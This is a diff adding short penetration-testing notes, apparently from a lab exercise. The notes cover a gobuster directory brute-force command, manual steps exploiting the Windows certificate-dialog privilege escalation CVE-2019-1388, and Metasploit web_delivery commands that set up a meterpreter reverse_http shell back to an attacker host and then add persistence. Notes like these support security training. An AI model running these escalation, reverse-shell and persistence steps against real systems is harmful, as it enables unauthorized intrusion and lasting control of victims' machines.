@@ -1,0 +1,21 @@
+Gobuster is a tool used to brute-force
+
+gobuster dir -u http://10.10.7.91 -w /usr/share/dirb/wordlists/big.txt -t 40
+-u, --url string - The target URL
+-w, --wordlist string - Path to the wordlist
+-t, --threads int - Number of concurrent threads (default 10)
+
+CVE-2019-1388 Detail - An elevation of privilege vulnerability exists in the Windows Certificate Dialog when it does not properly enforce user privileges, aka 'Windows Certificate Dialog Elevation of Privilege Vulnerability'.
+
+When running a privilged program, it asks for the password. if we click show more details and then take a look at the Certificate it opens a IE with permissions. now we do crtl+s and instead of save we open a cmd, wich will have privileges.
+
+Using metasploit to gain shell access:
+
+use exploit/multi/script/web_delivery
+show targets
+set target 2 - 2 is the powershell
+set lhost 10.8.252.117
+set payload windows/meterpreter/reverse_http
+run -j
+copy the code and paste it on the privilged shell in windows
+run persistence -X - make the shell come up 
